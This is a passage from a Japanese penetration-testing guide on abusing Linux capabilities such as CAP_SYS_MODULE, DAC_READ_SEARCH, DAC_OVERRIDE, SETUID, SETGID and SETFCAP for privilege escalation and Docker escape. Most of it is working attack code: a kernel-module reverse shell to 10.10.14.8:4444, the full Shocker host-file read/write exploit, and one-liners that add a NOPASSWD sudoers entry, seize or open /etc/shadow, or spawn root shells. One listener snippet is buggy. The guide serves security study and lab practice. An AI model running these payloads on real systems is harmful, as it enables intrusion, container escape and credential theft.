/usr/bin/python2.7 = cap_sys_module+ep
```

デフォルトでは、**`modprobe`** コマンドは、ディレクトリ **`/lib/modules/$(uname -r)`** 内で依存関係リストファイルとマップファイルを確認します。\
これを悪用するために、偽の **lib/modules** フォルダーを作成しましょう。

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

次に、**下にある2つの例を参考にカーネルモジュールをコンパイルしてコピーし**、このフォルダーに配置します：

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

最後に、このカーネルモジュールをロードするために必要な Python コードを実行します:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**バイナリを使った例 2**

次の例では、バイナリ **`kmod`** がこの capability を持っています。

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

これは、コマンド **`insmod`** を使ってカーネルモジュールを挿入できることを意味します。この権限を悪用して **reverse shell** を取得するには、以下の例に従ってください。

**環境での例（Docker breakout）**

次のコマンドを使って、docker コンテナ内で有効な capabilities を確認できます。

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

前の出力を見ると、**SYS_MODULE** capability が有効になっています。<sup>[[14]](#references)</sup>

**リバースシェル**を実行する**カーネルモジュール**と、それを**コンパイル**するための**Makefile**を**作成**します:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Makefile 内の各 make の語の前にある空白文字は、スペースではなく**タブでなければなりません**！

`make` を実行してコンパイルします。

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

最後に、あるシェル内で `nc` を起動し、別のシェルから**モジュールをロード**すると、`nc` プロセス内でシェルを取得できます。

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**この手法のコードは、「Abusing SYS_MODULE Capability」のラボからコピーしたものです。** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

この手法の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)にあります。

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)を使うと、プロセスは**ファイルの読み取り権限、およびディレクトリの読み取り・実行権限を迂回**できます。また、`open_by_handle_at(2)`の使用も許可されます。このシステムコールは、同じマウント済みファイルシステムのマウントファイルディスクリプターを基準として、有効なファイルハンドルを解釈します。この機能だけで、プロセスのマウント名前空間の外にあるすべてのファイルに自動的にアクセスできるわけではありません。ファイルハンドルを使った脱出には、ホスト上で有効なファイルシステム参照、有効または発見可能なハンドル、互換性のあるファイルシステムとストレージ構成が必要であり、さらにruntimeやLSMによって阻止されないことも条件となります。過去のDocker「Shocker」手法では、影響を受ける構成でこのような条件がそろった場合の動作が実証されています。分析については[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)を参照してください。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**つまり、ファイルの読み取り権限チェックと、ディレクトリの読み取り・実行権限チェックを迂回できます。**<sup>[[14]](#references)</sup>

このcapabilityを持つ**カスタム実行ファイル**については、何を読み取り、呼び出し元に何を返すのかを調べてください。呼び出し元が指定した保護対象のパス名と、指定したプレフィックス長を受け取り、そのプレフィックス全体のダイジェストを返すファイルスキャン用ヘルパーは、ファイル読み取りオラクルとして機能する可能性があります。最初の`n-1`バイトを復元したら、次のバイトの候補ごとにダイジェストを計算し、長さ`n`でヘルパーが返すダイジェストと比較できます。この手法は、暗号学的な衝突を見つけることにも、特定のMD5に依存することにも基づいていません。任意の長さを指定したクエリを繰り返せることと、決定論的なダイジェストが見えることに依存します。ファイル全体のダイジェストだけでは、同じ手法が成立するとは限りません。呼び出し元がヘルパーを実行できること、そのファイルcapabilityが有効になること、指定したパスにヘルパーのマウント名前空間からアクセスできること、そして説明どおりの入力・出力動作が実際にあることを確認してください。パッシブな列挙中に、テスト目的で未知の特権付きヘルパーを実行しないでください。

**バイナリの例**

バイナリは、その名前空間からアクセスできるファイルを読み取れます。そのため、たとえば`tar`のようなファイルがこのcapabilityを持っていれば、shadowファイルを読み取れます。

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**binary2 の例**

この場合、**`python`** binary にこの capability があるとします。root files を一覧表示するには、次のようにします:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

また、ファイルを読み取るには、次のようにします:

```python
print(open("/etc/shadow", "r").read())
```

**環境内での例（Docker breakout）**

`capsh --print` を使用して、Docker コンテナ内で有効になっている capabilities を確認できます。<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

前の出力では、**DAC_READ_SEARCH** capability が有効になっていることが確認できます。この capability は DAC の読み取り・検索チェックを回避し、`open_by_handle_at(2)` を許可します。プロセスのデバッグを可能にする capability ではありません。<sup>[[14]](#references)</sup>

以下の exploit の仕組みについては [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) を参照してください。簡単に説明すると、**CAP_DAC_READ_SEARCH** は権限チェックなしでファイルシステム内をたどることを可能にし、`open_by_handle_at(2)` を許可します。関連する namespace と mount にアクセスできる場合、これにより他のプロセスが開いたファイルが露出する可能性があります。<sup>[[13]](#references)[[14]](#references)</sup>

これらの権限を悪用してホスト上のファイルを読み取る元の exploit は、こちらにあります: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、読み取るファイルを最初の引数として指定し、結果をファイルに出力できる**改変版**です。<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> exploit は、host 上に mount されているものへのポインターを見つける必要があります。元の exploit ではファイル `/.dockerinit` を使用していましたが、この modified version では `/etc/hostname` を使用します。exploit が動作しない場合は、別のファイルを指定する必要があるかもしれません。host 上に mount されているファイルを見つけるには、`mount` コマンドを実行してください。

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit は、host 上に mount されているものへのポインターを見つける必要があります。元の exploit ではファイル `/.dockerinit` を使用していましたが、この modified version では...](<../../images/image (407) (1).png>)

**この technique の code は、** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)**の「Abusing DAC_READ_SEARCH Capability」lab からコピーされました。**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**この capability は、ファイルの読み取りと書き込みの権限チェック、およびほとんどの実行チェックを回避します**。通常のファイルを実行するには、少なくとも1つの実行ビットが設定されている必要があります。読み取り専用の mount、immutable state、または LSM による拒否は回避しません。<sup>[[14]](#references)</sup>

特権グループへの所属によって読み取りまたは書き込みが可能になるファイルを探してください。有用な対象は、target の所有者と mode bits によって異なります。<sup>[[14]](#references)</sup>

**バイナリの例**

この例では vim にこの capability が設定されているため、_passwd_、_sudoers_、_shadow_ などのファイルを変更できます:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**バイナリ2の例**

この例では、**`python`**バイナリにこのcapabilityが設定されています。pythonを使って任意のファイルを上書きできます：

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**環境変数 + CAP_DAC_READ_SEARCH の例（Docker breakout）**

`CAP_DAC_READ_SEARCH` は `open_by_handle_at(2)` を許可しますが、書き込み権限チェックは**回避しません**。解決済みハンドルを通じて書き込むには、プロセスの実効ファイルシステム UID/GID または ACL による書き込みアクセス権、あるいは `CAP_DAC_OVERRIDE` が別途必要です。また、ホストに関係するファイルシステム参照、サポート対象のファイルハンドル、書き込み可能なマウント、およびランタイム/LSM ポリシーが操作を許可している必要があります。実効 capabilities と ID を確認してください。どちらか一方の capability だけでは、書き込み可能なホスト上の対象があるとは限りません。[capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) と [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html) を参照してください。<sup>[[14]](#references)[[26]](#references)</sup>

まず、ホストの任意のファイルを読み取るために [**DAC_READ_SEARCH capability を悪用する**](linux-capabilities.md#cap_dac_read_search) 前のセクションを読み、exploit を**コンパイル**してください。\
以下の歴史的なサンプルは、解決済みファイルを `O_RDWR` で開こうとします。前述のファイルシステムおよび書き込み権限の条件を満たす場合にのみ成功します。

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Docker containerから**escapeする**には、ホストから`/etc/shadow`と`/etc/passwd`を**ダウンロード**し、それらに**新しいユーザーを追加**して、`shocker_write`を使って上書きできます。その後、ssh経由で**アクセス**します。

**この手法のコードは、**[**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)**の「Abusing DAC_OVERRIDE Capability」ラボからコピーされました。**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**このcapabilityにより、プロセスはファイルの所有者を変更できます。**<sup>[[14]](#references)</sup>

**バイナリを使った例**

**`python`**バイナリにこのcapabilityがあるとします。**`shadow`**などのファイルの所有者を変更し、他の権限が許せば、そのアクセス権を使ってファイルを変更できます。

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

または、この capability を持つ **`ruby`** バイナリで:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**この capability は、権限の変更を含む多くのファイル操作で、所有者チェックを回避します**。<sup>[[14]](#references)</sup>

**バイナリを使った例**

python にこの capability がある場合、shadow ファイルの権限を変更し、**root のパスワードを変更**して、権限を昇格できます:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**この capability により、プロセスはカーネルが適用する認証情報および capability のルールに従って、有効ユーザー ID を変更できます**。<sup>[[14]](#references)</sup>

**バイナリを使った例**

python にこの **capability** があれば、簡単に悪用して root に権限昇格できます。

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**別の方法:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

For **custom** な実行ファイルに effective `CAP_SETUID` がある場合、capability だけで shell が得られると決めつけず、到達可能なコードパスを調べてください。[`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) の*format string*として呼び出し元が制御できるテキストを渡すと、プロセスメモリを読み取ったり変更したりできる可能性があります。実際に権限を移行できるかどうかは、脆弱な呼び出し、制御可能な入力、そして `setuid(0)` の後に実行される処理に左右されます。その処理が名前で外部ヘルパーを起動する場合は、起動時の effective identity、実際の `PATH`、および先に検索されるディレクトリのうち呼び出し元が書き込み可能かつ通過可能なものがあるかを確認してください。ファイル capability が有効でない場合、`no_new_privs` が設定されている場合、信頼できる固定のヘルパーパスが使われている場合、またはその分岐に到達できない場合は、結果が変わります。バイナリまたは入手可能なソースをオフラインで確認してください。通常の列挙中に、疑わしい特権付きヘルパーを実行しないでください。

## CAP_SETGID

**この capability により、カーネルが適用する credential および capability の規則に従って、プロセスは effective group ID を変更できます**。<sup>[[14]](#references)</sup>

特権を昇格するために**上書きできるファイル**は多数あります。[**ここからアイデアを得られます**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリの例**

この場合、任意の group を偽装できるため、group が読み取り可能な興味深いファイルを探してください。

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

権限昇格に悪用できるファイル（読み取りまたは書き込みによる）を見つけたら、次の方法で**興味深いグループになりすましたシェルを取得**できます。

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

この場合、shadow グループになりすましているため、ファイル `/etc/shadow` を読み取れます。

```bash
cat /etc/shadow
```

### 複合チェーン: CAP_SETGID + CAP_CHOWN

両方の capability を同じ helper で利用できる場合、実用的なチェーンは次のとおりです。

1. EGID を `shadow`（または別の特権グループ）に切り替える。
2. `/etc/shadow` に `chown` を使い、グループを `shadow` のまま UID を自分のものに設定する。
3. 対象のハッシュを読み取り、crack/pivot する。

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

これにより、直接root権限を得る必要がなくなり、credential reuseを介して横展開するには十分な場合がよくあります。

**docker**がインストールされている場合は、**docker group**を**impersonate**し、[**docker socket**を悪用して権限を昇格](#writable-docker-socket)できます。

## CAP_SETFCAP

**このcapabilityにより、プロセスはファイルcapabilitiesを設定できます**。<sup>[[14]](#references)</sup>

**バイナリを使った例**

pythonにこの**capability**があれば、簡単に悪用してrootに権限昇格できます。

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> 新たに書き込まれた file capability set は以前の set を置き換えます。そのため、helper を新しい capabilities のみで実行すると、別のファイルを更新するための `CAP_SETFCAP` が保持されなくなる場合があります。<sup>[[14]](#references)[[25]](#references)</sup>

[SETUID capability](linux-capabilities.md#cap_setuid) を取得したら、そのセクションで権限昇格の方法を確認できます。

**環境を使った例（Docker breakout）**

Docker のドキュメントに記載されたデフォルトの capability set には **CAP_SETFCAP** が含まれますが、実際の set はランタイム設定によって異なります。<sup>[[19]](#references)</sup>
次のコマンドでプロセスの capabilities を確認できます。

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

このケーパビリティによりファイルのケーパビリティを書き込めますが、それ自体では現在のプロセスにそのケーパビリティを付与したり、ファイルの実行時に適用されるファイル、bounding set、namespace のルールを回避したりすることはできません。<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

ファイルに許可された capabilities はプロセスの capability bounding set によって制限され、ファイルの effective bit は、ファイルの許可セットをプロセスの effective set に昇格させるかどうかを制御します。そのため、ファイルに capabilities を追加しても、要求したすべての capability が実行時に自動的に使用可能になるわけではありません。<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`/dev/mem`、`/dev/kmem`、`/proc/kcore` へのアクセス、`mmap_min_addr` の変更、`ioperm(2)` および `iopl(2)` システムコールへのアクセス、各種ディスクコマンドなど、複数の機密性の高い操作を可能にします。`FIBMAP ioctl(2)` もこの capability によって有効になり、[過去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)に問題を引き起こしたことがあります。man ページによると、これにより保持者は他のデバイスに対して、デバイス固有のさまざまな操作も実行できます。<sup>[[14]](#references)</sup>

これは **privilege escalation** や **Docker breakout** に役立つ可能性があります。<sup>[[14]](#references)</sup>

この capability だけでは、実用的なインターフェースは得られません。コンテナからの breakout には、アクセス可能なホストデバイスまたはリソースに加え、device-cgroup と filesystem の権限、およびハードウェアや kernel に固有の手法が必要です。厳格な `/dev/mem` の制限、kernel lockdown、仮想化、seccomp、LSM ポリシーにより、一般的な経路は通常遮断されます。まず capability と露出状況を確認してください:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

`/dev/mem` が承認済みのインターフェースである場合、使い捨てのラボ環境では、その環境のハードウェアマップから選択した範囲を読み取り、ハッシュ化することで、境界を越えたノードメモリの開示を実証できます。

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Do not guess the range: MMIO 領域を読み取ると副作用が発生する場合があり、あるプラットフォームで有効なアドレスが、別のプラットフォームではハードウェアやカーネルメモリを制御する可能性があります。カーネルメモリの変更やデバイスの制御には、承認されたプラットフォーム固有の proof が必要です。安全な汎用の raw-write の例はありません。

## CAP_KILL

**この capability は、カーネルが定めるケースにおいて、プロセスにシグナルを送信する際の権限チェックを回避します**。<sup>[[14]](#references)</sup>

**binary を使った例**

**`python`** binary がこの capability を持っているとします。**サービスまたはソケットの設定ファイル**（あるいはサービスに関連する設定ファイル）を変更することもできるなら、そのファイルに backdoor を仕込めます。その後、そのサービスに関連するプロセスを kill し、新しい設定ファイルが実行されて backdoor が動作するのを待つことができます。

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**kill による Privesc**

kill capability があり、**root（または別のユーザー）として実行中の node プログラム**があれば、そのプログラムに**シグナル SIGUSR1 を送信**して、**node debugger を起動**させ、そこに接続できる可能性があります。

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**この capability により、1024 未満の Internet ポートにバインドできます。** これによって、より広範な権限昇格が直接可能になるわけではありません。<sup>[[14]](#references)</sup>

**バイナリを使った例**

**`python`** にこの capability が設定されている場合、任意のポートで待ち受けられ、そのポートから他の任意のポートにも接続できます（一部のサービスでは、特定の特権ポートからの接続が必要です）。

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

